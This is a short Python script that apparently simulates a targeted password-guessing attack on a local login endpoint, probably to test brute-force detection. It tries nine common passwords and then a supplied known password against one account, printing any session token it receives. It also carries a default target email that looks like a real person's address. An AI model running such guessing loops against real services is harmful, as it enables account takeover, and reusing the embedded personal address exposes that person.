"""
Targeted brute-force: tries 9 wrong passwords then the real one on a specific account.
Usage:
  python3 targeted-attack.py
  USER_AUTH_URL=http://localhost:30300 python3 targeted-attack.py
"""
import os
import time
import requests

USER_AUTH_URL = os.environ.get("USER_AUTH_URL", "http://localhost:30300")
TARGET_EMAIL  = os.environ.get("TARGET_EMAIL",  "ybenchikh472@gmail.com")
REAL_PASSWORD = os.environ.get("REAL_PASSWORD", "00000000")

ATTEMPTS = [
    (TARGET_EMAIL, "123456"),
    (TARGET_EMAIL, "password"),
    (TARGET_EMAIL, "admin123"),
    (TARGET_EMAIL, "qwerty"),
    (TARGET_EMAIL, "letmein"),
    (TARGET_EMAIL, "welcome1"),
    (TARGET_EMAIL, "abc123"),
    (TARGET_EMAIL, "11111111"),
    (TARGET_EMAIL, "iloveyou"),
    (TARGET_EMAIL, REAL_PASSWORD),   # attempt #10 — the real password
]

LOGIN_URL = f"{USER_AUTH_URL}/api/auth/login"

print(f"[targeted-attack] Target   : {TARGET_EMAIL}")
print(f"[targeted-attack] Endpoint : {LOGIN_URL}")
print(f"[targeted-attack] ==========================================")

for i, (email, password) in enumerate(ATTEMPTS, 1):
    try:
        resp = requests.post(
            LOGIN_URL,
            json={"email": email, "password": password},
            timeout=3,
        )
        status = resp.status_code
        if status == 200:
            token = resp.json().get("token", "")[:50]
            print(f"[targeted-attack] ✅ SUCCESS  [{i:02d}/10]  {email}  pwd: {password:<15}  → HTTP {status}  ← PASSWORD FOUND!")
            print(f"[targeted-attack]    Token: {token}...")
        else:
            print(f"[targeted-attack] ❌ FAILED   [{i:02d}/10]  {email}  pwd: {password:<15}  → HTTP {status}")
    except Exception as e:
        print(f"[targeted-attack] ⚠️  TIMEOUT  [{i:02d}/10]  {email}  pwd: {password:<15}  → {e}")

    time.sleep(0.5)

print(f"[targeted-attack] ==========================================")
print(f"[targeted-attack] DONE")
